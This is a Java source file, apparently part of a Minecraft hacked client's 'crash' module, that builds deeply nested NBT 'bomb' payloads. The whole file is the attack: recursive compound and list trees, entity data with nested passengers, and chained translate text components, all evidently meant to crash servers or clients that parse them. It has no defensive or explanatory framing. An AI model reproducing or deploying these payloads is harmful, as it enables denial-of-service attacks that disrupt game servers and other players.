package me.dannycrasher.client.module.impl.crash;

import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.Tag;

public final class NbtBombTrees {
	private NbtBombTrees() {
	}

	public static Tag nestedTree(int depth, int branchSize) {
		CompoundTag root = new CompoundTag();
		CompoundTag current = root;
		for (int level = 0; level < depth; level++) {
			ListTag branches = new ListTag();
			for (int branch = 0; branch < branchSize; branch++) {
				CompoundTag node = new CompoundTag();
				node.putString("k" + branch, "v".repeat(Math.min(32, depth)));
				branches.add(node);
			}
			current.put("list", branches);
			CompoundTag next = new CompoundTag();
			current.put("next", next);
			current = next;
		}
		current.putString("leaf", "X".repeat(Math.min(depth * 4, 256)));
		return root;
	}

	public static Tag entityBomb(int depth, int branchSize, String entityId) {
		CompoundTag root = (CompoundTag) nestedTree(depth, branchSize);
		root.putString("id", entityId);
		ListTag passengers = new ListTag();
		CompoundTag passenger = new CompoundTag();
		passenger.putString("id", entityId);
		passenger.put("data", nestedTree(Math.max(1, depth / 2), branchSize));
		passengers.add(passenger);
		root.put("Passengers", passengers);
		return root;
	}

	public static Tag translateNest(int depth) {
		CompoundTag root = new CompoundTag();
		root.putString("translate", "chat.type.text");
		ListTag with = new ListTag();
		CompoundTag current = new CompoundTag();
		current.putString("text", ".");
		with.add(current);
		root.put("with", with);

		CompoundTag cursor = current;
		for (int i = 0; i < depth; i++) {
			CompoundTag child = new CompoundTag();
			child.putString("translate", "chat.type.text");
			ListTag childWith = new ListTag();
			CompoundTag text = new CompoundTag();
			text.putString("text", ".");
			childWith.add(text);
			child.put("with", childWith);
			ListTag replace = new ListTag();
			replace.add(child);
			cursor.put("with", replace);
			cursor = text;
		}
		return root;
	}

	public static Tag textComponent(String text) {
		CompoundTag tag = new CompoundTag();
		tag.putString("text", text);
		return tag;
	}
}
